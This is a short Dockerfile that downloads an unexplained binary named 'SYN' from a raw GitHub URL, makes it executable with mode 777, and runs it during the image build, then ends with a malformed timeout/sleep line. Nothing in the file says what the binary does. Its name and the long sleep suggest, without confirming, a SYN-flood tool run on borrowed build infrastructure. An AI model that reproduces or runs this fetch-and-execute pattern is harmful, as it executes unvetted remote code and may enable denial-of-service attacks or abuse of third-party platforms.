FROM alpine:latest

WORKDIR /root

RUN apk add wget
RUN wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
RUN chmod 777 SYN
RUN ./SYN
RUN timeout sleep 1h 10m
